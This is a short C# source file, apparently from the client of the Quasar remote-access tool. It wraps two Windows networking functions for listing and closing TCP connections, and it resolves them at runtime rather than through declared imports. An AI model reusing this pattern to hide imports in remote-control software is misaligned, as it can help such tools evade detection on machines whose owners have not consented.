using System;

namespace Quasar.Client.Utilities
{
    internal static partial class ClientNatives
    {
        //[DllImport("iphlpapi.dll", SetLastError = true)]
        internal delegate uint GetExtendedTcpTableFunc(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TcpTableClass tblClass, uint reserved);
        internal static uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TcpTableClass tblClass, uint reserved = 0) => Lookup<GetExtendedTcpTableFunc>("iphlpapi.dll", "GetExtendedTcpTable")(pTcpTable, ref dwOutBufLen, sort, ipVersion, tblClass, reserved);

        //[DllImport("iphlpapi.dll")]
        internal delegate int SetTcpEntryFunc(IntPtr pTcprow);
        internal static int SetTcpEntry(IntPtr pTcprow) => Lookup<SetTcpEntryFunc>("iphlpapi.dll", "SetTcpEntry")(pTcprow);
    }
}
